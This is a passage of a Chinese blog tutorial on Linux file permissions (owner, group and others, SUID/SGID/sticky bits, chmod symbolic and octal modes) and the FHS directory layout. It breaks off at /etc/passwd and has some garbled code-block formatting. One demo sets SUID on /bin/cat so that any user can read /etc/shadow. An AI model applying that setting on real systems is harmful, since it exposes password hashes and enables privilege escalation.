src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/08dd67deb199e2a1f510f0377e72e137.png" alt="img"></p><p>在 Linux 系统中，每个文件都明确规定了不同身份用户的访问权限，通过 <code>ls -al</code>命令即可看到。</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708174528854.png" alt="image-20250708174528854"></p><p>可以看到，每行的第一列表示的就是各文件针对不同用户设定的权限，一共 11 位，但第 1 位用于表示文件的具体类型，最后一位此文件受 SELinux 的安全规则管理。因此，为文件设定不同用户的读、写和执行权限，仅涉及到 9 位字符。</p><h4 id="文件拥有者（User）"><a href="#文件拥有者（User）" class="headerlink" title="文件拥有者（User）"></a>文件拥有者（User）</h4><p>当一个用户创建了一个文件，这个用户就是这个文件的文件所有者。文件所有者对文件拥有最高权限，除非文件所有者开放权限，否则其他人无法对文件执行查看、修改等操作。<strong>这也是 Linux 系统能够保护用户隐私的最关键的原因。</strong>在文件所有者占有文件之后，需要文件所有者对其他用户开放权限，其他用户才能查看、修改文件。</p><p>如果仅区分 “文件所有者” 和 “其他用户”，那么文件所有者对其他用户开放权限后，所有其他用户均能查看、修改文件。但是，若文件所有者希望仅对部分用户开放，那么仅仅区分 “用户所有者” 和 “其他用户” 显然不满足需求。这就引入了 “用户组的概念”。</p><h4 id="所属组（Group）"><a href="#所属组（Group）" class="headerlink" title="所属组（Group）"></a>所属组（Group）</h4><p>将 “其他用户” 区分为用户组成员和其他人后，若文件所有者希望对部分用户开放权限，而对其他人继续保持私有，则只需要将这部分用户与文件所有者划入一个用户组。这样，这部分用户就成了与文件所有者同组的用户组成员。用户可以对用户组成员开放文件权限，用户组成员则具备了查看、修改文件的权限，而对其他无关用户保持私有。</p><p>用户组成员在团队开发中非常有帮助。例如，团队成员之间保持文件资源共享，但对非团队成员保持私有，这就需要将文件所有者与团队成员用户划分为同一个用户组，再对用户组成员开放权限即可。</p><p>需要注意的是，一个用户可在多个用户组中。</p><h4 id="其他组（Others）"><a href="#其他组（Others）" class="headerlink" title="其他组（Others）"></a>其他组（Others）</h4><p>顾名思义，就是与文件所有者没有任何联系的用户，即不是文件所有者也不是所在文件所属用户组。</p><h4 id="超级管理员（root）"><a href="#超级管理员（root）" class="headerlink" title="超级管理员（root）"></a>超级管理员（root）</h4><p>由于Linux系统中，root具有最高权限，可以执行任何想要执行的操作，也正因为如此，处于安全考虑，一般情况下不推荐使用 root 用户进行日常使用。root 用户所所在的用户组称为 “root组”，处于 root 组的普通用户，能够通过 sudo 命令获取 root 权限，即我们是可以通过sudo权限来操作文件的。</p><h4 id="AAA基础"><a href="#AAA基础" class="headerlink" title="AAA基础"></a>AAA基础</h4><p>AAA指的是Authentication、Authorization、Accounting，即认证、授权和审计。</p><p>认证：验证用户是否可以获得权限，是AAA的第一步，即验证身份；<br>授权：授权用户可以使用那些服务或资源，即身份验证成功后，赋予这个身份相应的权限；<br>审计：记录用户的操作情况，在Linux中，日志就是审计的一种手段。<br>Linux的用户和组管理可以说是基于AAA进行的，首先用户登录输入用户名密码，就是认证的过程；其次，在用户登录成功后，所拥有的权限各不相同，这就是授权；最后，用户的操作历史会记录在日志中，这是审计。</p><h3 id="文件权限类型"><a href="#文件权限类型" class="headerlink" title="文件权限类型"></a>文件权限类型</h3><h4 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h4><table><thead><tr><th>标识</th><th>含义</th></tr></thead><tbody><tr><td>- &#x2F; f</td><td>普通文件(regular file)</td></tr><tr><td>d</td><td>目录文件(文件夹)(directroy)</td></tr><tr><td>p</td><td>管道文件(pipe)或命名管道文件(named pipe)</td></tr><tr><td>l</td><td>符号链接文件(软连接,快速找到文件)(symbolic link)</td></tr><tr><td>b</td><td>块设备文件(如磁盘,磁盘叫块设备,因为存储是以块为基本单位的)(block-oriented device file)</td></tr><tr><td>c</td><td>字符设备文件(如键盘,显示器 , 按字节字符顺序显示,输入)(charcter-oriented device file)</td></tr><tr><td>s</td><td>套接字文件(socket)</td></tr></tbody></table><h4 id="一般权限"><a href="#一般权限" class="headerlink" title="一般权限"></a>一般权限</h4><p>在Linux中，任何文件或者目录都有三种权限：<strong>读（Read）、写（Write）、执行（Execute）</strong></p><table><thead><tr><th></th><th>文件</th><th>目录</th></tr></thead><tbody><tr><td>Read</td><td>可以读取、查看文件的内容，比如：<code>cat、more、less、head、tail</code>等</td><td>可以读取、查看目录下边的内容，比如：<code>ls</code>等</td></tr><tr><td>Write</td><td>可以修改文件的内容，比如：<code>vi</code>或者<code>vim</code>等</td><td>可以修改目录中的内容，创建子目录、删除子目录、创建文件、删除文件、重命名文件或者目录</td></tr><tr><td>Execute</td><td>如果该文件是可执行文件（.sh），可以直接运行，比如：<code>./xxx.sh</code></td><td>可以进去该目录，比如：<code>cd</code>等</td></tr></tbody></table><h4 id="附加权限"><a href="#附加权限" class="headerlink" title="附加权限"></a>附加权限</h4><p><code>linux</code>除了设置正常的读写操作权限外，还有关于一类设置也是涉及到权限，叫做<code>Linxu</code>附加权限。包括 SET位权限（<code>suid</code>，<code>sgid</code>）和粘滞位权限（<code>sticky</code>）。</p><table><thead><tr><th>特殊权限</th><th>名称</th><th>用法对象</th><th>作用描述</th></tr></thead><tbody><tr><td><code>s</code></td><td>SUID（Set User ID）</td><td>可执行文件</td><td>运行时<strong>以文件拥有者身份</strong>执行</td></tr><tr><td><code>s</code></td><td>SGID（Set Group ID）</td><td>可执行文件或目录</td><td>文件：运行时以文件组身份执行；目录：新文件继承该组</td></tr><tr><td><code>t</code></td><td>Sticky Bit</td><td>目录</td><td>限制删除权限，只允许<strong>文件所有者</strong>删除自己的文件</td></tr></tbody></table><h5 id="SET位权限"><a href="#SET位权限" class="headerlink" title="SET位权限"></a>SET位权限</h5><p><code>suid/sgid</code>是为了使“没有取得特权用户要完成一项必须要有特权才可以执行的任务”而产生的。</p><p>一般用于给可执行的程序或脚本文件进行设置，其中SUID表示对属主用户增加SET位权限，SGID表示对属组内用户增加SET位权限。</p><p>执行文件被设置了SUID、SGID权限后，任何用户执行该文件时，将获得该文件属主、属组账号对应的身份。</p><h6 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a><strong>SUID</strong></h6><p><code>suid(setuid， set uid ID upon execution)</code>的意思是进程执行一个文件时通常保持进程拥有者的UID。然而，如果设置了可执行文件的<code>suid</code>位，进程就获得了该文件拥有者的UID。</p><ul><li><p>比如，一个普通账号 tester 需要修改自己的密码，就要访问 <code>/etc/shadow </code>这个系统文件。应该只有 root 才能访问<code> /etc/shadow</code> 这个文件，但实际tester 用户是可以修改 <code>/etc/shadow </code>这个文件内的密码的，就是通过 SUID 的功能。（passwd 命令是为数不多的必须要使用<code>suid</code>的命令之一）</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250714210422454.png" alt="image-20250714210422454"></p><p>在 Linux 中，所有账号的密码记录在<code> /etc/shadow</code> 这个文件中，并且只有 root 可以读写入这个文件</p></li><li><pre><code>ls -l /usr/bin/passwd<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ![](https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-14%20203243.png)</span><br><span class="line"></span><br><span class="line">当 s 出现在文件拥有者的 x 权限上时，就被称为 SETUID BITS 或 SETUID 。其特点如下：</span><br><span class="line"></span><br><span class="line">- SUID 权限仅对二进制可执行文件有效</span><br><span class="line">- 如果执行者对于该二进制可执行文件具有 x 的权限，执行者将具有该文件的所有者的权限</span><br><span class="line">- 本权限仅在执行该二进制可执行文件的过程中有效</span><br><span class="line"></span><br><span class="line"> tester 用户是如何利用 SUID 权限完成密码修改的：</span><br><span class="line"></span><br><span class="line">1. tester 用户对于 /usr/bin/passwd 这个程序具有执行权限，因此可以执行 passwd 程序</span><br><span class="line">2. passwd 程序的所有者为 root</span><br><span class="line">3. tester 用户执行 passwd 程序的过程中会暂时获得 root 权限</span><br><span class="line">4. 因此 tester 用户在执行 passwd 程序的过程中可以修改 /etc/shadow 文件</span><br><span class="line"></span><br><span class="line">但是如果由 tester 用户执行 cat 命令去读取 /etc/shadow 文件确是不行的：</span><br><span class="line"></span><br><span class="line">![image-20250714211406144](https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250714211406144.png)</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/20161229174318163)</span><br><span class="line"></span><br><span class="line">原因很清楚，tester 用户没有读 /etc/shadow 文件的权限，同时 cat 程序也没有被设置 SUID。</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/952033-20180915174007691-528388363.png)</span><br><span class="line"></span><br><span class="line">如果想让任意用户通过 cat 命令读取` /etc/shadow` 文件的内容也是非常容易的，给它设置 SUID 权限即可</span><br><span class="line"></span><br></pre></td></tr></table></figure>sudo chmod 4755 /bin/cat   #设置SUID权限sudo chmod 755 /bin/cat    #移除SUID权限<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20250714211852864](https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250714211852864.png)</span><br><span class="line"></span><br><span class="line">###### SGID</span><br><span class="line"></span><br><span class="line">`sgid(setgid， set group ID upon execution )`当 s 标志出现在用户组的 x 权限时称为 SGID。SGID 的特点与 SUID 相同。</span><br><span class="line"></span><br><span class="line"> 用`/usr/bin/plocate` 程序来演示其用法。`plocate `程序通过查询数据库文件 `/var/lib/plocate/plocate.db `实现快速的文件查找。 `plocate `程序的权限如下图所示：</span><br><span class="line"></span><br><span class="line">- ![image-20250715110342174](https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250715110342174.png)</span><br><span class="line"></span><br><span class="line">- 很明显，它被设置了 SGID 权限。下面是数据库文件` /var/lib/plocate/plocate.db` 的权限信息:</span><br><span class="line"></span><br><span class="line">- ![image-20250715111511020](https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250715111511020.png)</span><br><span class="line"></span><br><span class="line">- 普通用户 `tester` 执行 `plocate` 命令时，`tester` 就会获得用户组` plocate `的执行权限，又由于用户组 `plocate `对 `plocate.db `具有读权限，所以 tester 就可以读取` plocate.db` 了。程序的执行过程如下图所示：</span><br><span class="line"></span><br><span class="line">- ![image-20250715113114441](https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250715113114441.png)</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  </span><br></pre></td></tr></table></figure></code></pre></li></ul><p>在许多场景下，使用<code>suid </code>和<code>sgid </code>非常实用，但是不恰当地使用这些权限可能为系统带来安全风险。所以应该尽量避免使用SET位权限程序。</p><h6 id="SET位权限（10位权限）"><a href="#SET位权限（10位权限）" class="headerlink" title="SET位权限（10位权限）"></a>SET位权限（10位权限）</h6><p>如果一个文件被设置了suid或sgid位，会分别表现在所有者或同组用户的权限的可执行位上；如果文件设置了suid还设置了x（执行）位，则相应的执行位表示为s(小写)。但是，如果没有设置x位，它将表示为S(大写)。如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、-rwsr-xr-x 表示设置了suid，且拥有者有可执行权限</span><br><span class="line">2、-rwSr--r-- 表示suid被设置，但拥有者没有可执行权限</span><br><span class="line">3、-rwxr-sr-x 表示sgid被设置，且群组用户有可执行权限</span><br><span class="line">4、-rw-r-Sr-- 表示sgid被设置，但群组用户没有可执行权限</span><br><span class="line"></span><br><span class="line">chmod u+s filename 设置suid位</span><br><span class="line">chmod u-s filename 去掉suid设置</span><br><span class="line">chmod g+s filename 设置sgid位</span><br><span class="line">chmod g-s filename 去掉sgid设置</span><br></pre></td></tr></table></figure><h5 id="粘滞位权限"><a href="#粘滞位权限" class="headerlink" title="粘滞位权限"></a>粘滞位权限</h5><p>我们知道一个文件是否可以被某个用户删除，主要取决与该文件所在目录对该文件是否有写的权限。如果用户对目录有写权限，用户不仅可以向该目录下添加文件，也可以删除该目录下的文件和子目录，即使该用户不是这些文件的所有者，而且也没有读或写许可。但是如果我们希望用户在该目录下只可以添加文件但不能删除该目录下的文件，这个时候我们就可以给父目录设置粘滞位权限。</p><p>粘滞位权限即sticky。一般用于为目录设置特殊的附加权限，当目录被设置了粘滞位权限后，即便用户对该目录有写的权限，也不能删除该目录中其他用户的文件数据。</p><p>设置了粘滞位权限的目录，是用ls查看其属性时，其他用户权限处的x将变为t。 使用<code>chmod</code>命令设置目录权限时，+t、-t权限模式可分别用于添加、移除粘滞位权限。粘滞位权限表示形式（10位权限）：</p><p>一个文件或目录被设置了粘滞位权限，会表现在其他组用户的权限的可执行位上。</p><p>如果文件设置了sticky还设置了x（执行）位，其他组用户的权限的可执行位为t(小写)。但是，如果没有设置x位，它将表示为T(大写)。如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、-rwsr-xr-t 表示设置了粘滞位且其他用户组有可执行权限</span><br><span class="line">2、-rwSr--r-T 表示设置了粘滞位但其他用户组没有可执行权限</span><br><span class="line"></span><br><span class="line">sticky权限同样可以通过chmod命令设置：</span><br><span class="line">chmod +t &lt;文件列表..&gt;</span><br></pre></td></tr></table></figure><p><code>/tmp/</code>目录就有SBIT特殊权限</p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250715161234932.png" alt="image-20250715161234932"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#root用户在/tmp/目录创建abc文件</span><br><span class="line"></span><br><span class="line">cd /tmp/</span><br><span class="line"> touch abc</span><br><span class="line">ll</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250715161619400.png" alt="image-20250715161619400"></p><h3 id="更改文件权限"><a href="#更改文件权限" class="headerlink" title="更改文件权限"></a>更改文件权限</h3><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/1575dcdcf873e83d4199a51f4de9bf26.png" alt="img"></p><p>以下是<code>chmod</code>命令的参数列表及其功能：</p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>u</td><td>指定用户权限</td></tr><tr><td>g</td><td>指定用户组权限</td></tr><tr><td>o</td><td>指定其他用户权限</td></tr><tr><td>a</td><td>指定所有用户权限（u、g和o的组合）</td></tr><tr><td>+</td><td>增加权限</td></tr><tr><td>-</td><td>移除权限</td></tr><tr><td>&#x3D;</td><td>设置权限</td></tr><tr><td>r</td><td>读取权限</td></tr><tr><td>w</td><td>写入权限</td></tr><tr><td>x</td><td>执行权限</td></tr><tr><td>数字模式</td><td>使用数字表示权限</td></tr><tr><td>文件&#x2F;目录</td><td>指定要修改权限的文件或目录</td></tr></tbody></table><p><code>chmod（change mode）</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod [可选项] &lt;mode&gt; &lt;file...&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708192305612.png" alt="image-20250708192305612"></p><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/image-20250708193108518.png" alt="image-20250708193108518"></p><p>范例：</p><ul><li><p>设置所有用户可读取文件 test.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~                       # 进入用户主目录</span><br><span class="line">touch test.txt             # 创建一个测试文件</span><br><span class="line">chmod ugo+r test.txt       # 这时你就可以用文件名操作了（因为就在当前目录）</span><br></pre></td></tr></table></figure></li><li><p>设置 <code>c.sh</code>只有 拥有者可以读写及执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+rwx c.sh</span><br></pre></td></tr></table></figure></li><li><p>设置文件 a.conf 与 b.xml 权限为拥有者与其所属同一个群组 可读写，其它组可读不可写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a+r,ug+w,o-w a.conf b.xml</span><br></pre></td></tr></table></figure></li><li><p>设置当前目录下的所有档案与子目录皆设为任何人可读写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R a+rw *</span><br></pre></td></tr></table></figure></li><li><p>命令将文件 <code>example.txt</code> 的所有者和用户组的读、写和执行权限设置为可用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ug+rwx example.txt</span><br></pre></td></tr></table></figure></li></ul><h3 id="数字权限"><a href="#数字权限" class="headerlink" title="数字权限"></a>数字权限</h3><p>权限的代号包括：</p><ul><li><code>r</code>：读取权限，数字代号为<code>4</code>；</li><li><code>w</code>：写入权限，数字代号为<code>2</code>；</li><li><code>x</code>：执行或切换权限，数字代号为<code>1</code>；</li><li><code>-</code>：不具任何权限，数字代号为<code>0</code>；</li><li><code>s</code>：当文件被执行时，根据<code>who</code>参数指定的用户类型设置文件的<code>setuid</code>或者<code>setgid</code>权限。</li></ul><p>如：</p><ul><li><p><code>rwx</code> &#x3D; 4 + 2 + 1 &#x3D; 7（若要同时设置 <code>rwx</code> (可读写运行） 权限则将该权限位 设置 为 4 + 2 + 1 &#x3D; 7）</p></li><li><p><code>rw</code> &#x3D; 4 + 2 &#x3D; 6 (若要同时设置<code>rw-</code>（可读写不可运行）权限则将该权限位 设置 为 4 + 2 &#x3D; 6）</p></li><li><p><code>rx </code>&#x3D; 4 +1 &#x3D; 5（若要同时设置 <code>r-x </code>（可读可运行不可写）权限则将该权限位 设置 为 4 +1 &#x3D; 5）</p></li></ul><p>上面我们提到，每个文件都可以针对三个粒度，设置不同的<code>rwx</code>(读写执行)权限。即我们可以用用三个8进制数字分别表示 拥有者 、群组 、其它组( u、 g 、o)的权限详情，并用<code>chmod</code>直接加三个8进制数字的方式直接改变文件权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chmod &lt;abc&gt; file...</span><br><span class="line"></span><br><span class="line">a,b,c各为一个数字，分别代表User、Group、及Other的权限。</span><br><span class="line">相当于简化版的</span><br><span class="line">chmod u=权限,g=权限,o=权限 file...</span><br><span class="line">而此处的权限将用8进制的数字来表示User、Group、及Other的读、写、执行权限</span><br></pre></td></tr></table></figure><p>范例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">设置所有人可以读写及执行</span><br><span class="line">chmod 777 file  (等价于  chmod u=rwx,g=rwx,o=rwx file 或  chmod a=rwx file)</span><br><span class="line"></span><br><span class="line">设置拥有者可读写，其他人不可读写执行</span><br><span class="line">chmod 600 file (等价于  chmod u=rw,g=---,o=--- file 或 chmod u=rw,go-rwx file )</span><br></pre></td></tr></table></figure><h4 id="十位权限"><a href="#十位权限" class="headerlink" title="十位权限"></a>十位权限</h4><p>十位二进制表示法 ，(三个属组的每个权限使用一个二进制位，再加一个最高位共十位)，可简化为三个八进制数字形式（如 755）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-rw------- (600)    只有拥有者有读写权限。</span><br><span class="line">-rw-r--r-- (644)    只有拥有者有读写权限；而属组用户和其他用户只有读权限。</span><br><span class="line">-rwx------ (700)    只有拥有者有读、写、执行权限。</span><br><span class="line">-rwxr-xr-x (755)    拥有者有读、写、执行权限；而属组用户和其他用户只有读、执行权限。</span><br><span class="line">-rwx--x--x (711)    拥有者有读、写、执行权限；而属组用户和其他用户只有执行权限。</span><br><span class="line">-rw-rw-rw- (666)    所有用户都有文件读、写权限。</span><br><span class="line">-rwxrwxrwx (777)    所有用户都有读、写、执行权限。</span><br></pre></td></tr></table></figure><p>上面我们用字符表示权限，其中 -代表无权限，r代表读权限，w代表写权限，x代表执行权限。（后九位的前3位对应拥有者权限、4-6位对应群组权限、7-9对应其他组权限）</p><p>实际上，后九位每个位置的意义（代表某个属组的某个权限）都是固定的，如果我们将各个位置权限的有无用二进制数 1和 0来代替，则只读、只写、只执行权限，可以用三位二进制数表示为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r-- = 100</span><br><span class="line">-w- = 010</span><br><span class="line">--x = 001</span><br><span class="line">--- = 000</span><br></pre></td></tr></table></figure><p>转换成八进制数，为 r&#x3D;4, w&#x3D;2, x&#x3D;1, -&#x3D;0（这也就是用数字设置权限时为何是4代表读，2代表写，1代表执行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rwx = 111 = 7</span><br><span class="line">rw- = 110 = 6</span><br><span class="line">r-x = 101 = 5</span><br><span class="line">r-- = 100 = 4</span><br><span class="line">-wx = 011 = 3</span><br><span class="line">-w- = 010 = 2</span><br><span class="line">--x = 001 = 1</span><br><span class="line">--- = 000 = 0</span><br><span class="line"></span><br><span class="line">-rw------- =  600</span><br><span class="line">-rw-rw-rw- =  666</span><br><span class="line">-rwxrwxrwx =  777</span><br></pre></td></tr></table></figure><h4 id="十二位权限"><a href="#十二位权限" class="headerlink" title="十二位权限"></a>十二位权限</h4><p>十二位二进制表示法(十二个二进制位)，可简化为四个八进制数字形式（如4755）</p><p>附加权限除了用十位权限形式表示外，还可以用用十二位字符表示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">11 10 9 8 7 6 5 4 3 2 1 0</span><br><span class="line">S  G  T r w x r w x r w x</span><br></pre></td></tr></table></figure><p>SGT分别表示SUID权限、SGID权限、和 粘滞位权限，这十二位分别对应关系如下：</p><p>第11位为SUID位，第10位为SGID位，第9位为sticky位，第8-0位对应于上面的三组rwx位（后九位）。</p><p>在这十二位的每一位上都置值。如果有相应的权限则为1， 没有此权限则为0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-rw-r-Sr-- 的值为： 0 1 0  1 1 0  1 0 0  1 0 0</span><br><span class="line">-rwsr-xr-x 的值为： 1 0 0  1 1 1  1 0 1  1 0 1</span><br><span class="line">-rwsr-sr-x 的值为： 1 1 0  1 1 1  1 0 1  1 0 1 </span><br><span class="line">-rwsr-sr-t 的值为： 1 1 1  1 1 1  1 0 1  1 0 1</span><br></pre></td></tr></table></figure><p>如果将则前三位SGT也转换成一个二进制数，则</p><ul><li><p>suid 的八进制数字是4</p></li><li><p>sgid 的代表数字是 2</p></li><li><p>sticky 位代表数字是1</p></li></ul><p>这样我们就可以将十二位权限三位三位的转化为4个八进制数。其中</p><ul><li>最高的一位八进制数就是suid，sgdi，sticky的权值。</li><li>第二位为 拥有者的权值</li><li>第三位为 所属组的权值</li><li>最后一位为 其他组的权值</li></ul><h2 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h2><p><img src="https://cdn.jsdelivr.net/gh/LLLLLL-del/Image/202304222054625.png" alt="img"></p><p> [Linux 目录结构](<a href="https://so.csdn.net/so/search?q=Linux">https://so.csdn.net/so/search?q=Linux</a> 目录结构&amp;spm&#x3D;1001.2101.3001.7020)</p><p><img src="https://blog.yzmcms.com/uploads/20180901/15358023505412.png" alt="Linux目录结构及详细介绍"></p><p><strong>Linux系统中一切皆是文件</strong>（包括设备，所以&#x2F;dev下可以有设备文件）， linux中文件和目录被组织成一个单根倒置树结构 ，linux文件系统是从根目录下开始用“&#x2F;”表示，以单根倒置树结构往下延伸。linux目录的配置方法是根据FHS（Filesystem Hierarchy Standard）标准所制定，所以无论哪个版本的linux系统，都会有这些目录。</p><h3 id="系统主要目录"><a href="#系统主要目录" class="headerlink" title="系统主要目录"></a>系统主要目录</h3><p><a href="https://blog.csdn.net/iamsongyu/article/details/84567438">CTF-web Linux中几个关键的文件</a></p><p>Ubuntu 的标准目录结构大体遵循 <strong>文件系统层次结构标准（FHS）</strong>。以下是系统中最重要的目录：</p><h4 id="bin"><a href="#bin" class="headerlink" title="/bin"></a><code>/bin</code></h4><p>bin 是 Binaries（二进制文件）的缩写，存放系统中最常用的二进制可执行文件（二进制文件）。基础系统所需要的那些命令位于此目录，也是最小系统所需要的命令；例如ls、cp、mkdir等命令。功能和&#x2F;usr&#x2F;bin类似，这个目录中的文件都是可执行的，普通用户都可以使用命令。</p><p>包含系统启动和单用户模式下使用的基本命令。这些命令是系统正常运行所必需的，并且在单用户模式或系统紧急修复时也可以使用。</p><p>常见的命令包括：</p><ul><li><strong>ls</strong>：列出目录内容。</li><li><strong>cp</strong>：复制文件或目录。</li><li><strong>mv</strong>：移动或重命名文件或目录。</li><li><strong>rm</strong>：删除文件或目录。</li><li><strong>cat</strong>：连接文件并显示输出。</li><li><strong>echo</strong>：显示消息。</li></ul><p>这些命令通常是静态链接的，确保在系统启动时不依赖于其他库文件。</p><h4 id="boot"><a href="#boot" class="headerlink" title="/boot"></a><code>/boot</code></h4><p>启动系统所需的文件，包括 Linux 内核、RAM 磁盘映像和引导加载器配置文件。系统启动时，启动加载程序（如 GRUB）会从这里加载内核和其他必要文件。</p><p>常见文件包括：</p><ul><li><strong>vmlinuz</strong>：压缩的 Linux 内核镜像文件。</li><li><strong>initrd.img</strong>：初始 RAM 盘，用于启动时加载必要的驱动程序和文件系统。</li><li><strong>grub</strong>：GRUB 启动加载程序的配置文件和模块。</li></ul><p>&#x2F;boot 目录中的文件对于系统启动至关重要，因此应谨慎修改。</p><h4 id="dev"><a href="#dev" class="headerlink" title="/dev"></a><code>/dev</code></h4><p>dev 是 Device（设备），包含所有设备文件（ Linux 的外部设备），这些文件不是普通文件，而是指向系统中各种硬件设备的接口，例如硬盘。在 Linux 中访问设备的方式和访问文件的方式是相同的。</p><p>常见的设备文件包括：</p><ul><li><strong>&#x2F;dev&#x2F;sda</strong>：第一个 SCSI 硬盘。</li><li><strong>&#x2F;dev&#x2F;tty</strong>：终端设备。</li><li><strong>&#x2F;dev&#x2F;null</strong>：空设备，丢弃所有写入其中的数据。</li><li><strong>&#x2F;dev&#x2F;random</strong>：随机数生成器。</li></ul><p>这些设备文件允许用户和应用程序以文件的方式访问硬件设备。</p><h4 id="etc"><a href="#etc" class="headerlink" title="/etc"></a><code>/etc</code></h4><p><a href="https://blog.csdn.net/weixin_42267615/article/details/134444760">ctf中常用的linux文件路径</a></p><p><code>etc </code>是 Etcetera（等等） 的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。影响所有用户的系统行为。包含所有的系统全局配置文件。这些文件定义了系统的各种设置和参数。</p><p>例如passwd存放用户账户信息，hostname存放主机名等。&#x2F;etc&#x2F;fstab是开机自动挂载一些分区的，在里面写入一些分区信息，就能实现开机挂载分区。</p><p>常见的配置文件和目录包括：</p><ul><li><strong>&#x2F;etc&#x2F;passwd</strong>：用户账                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               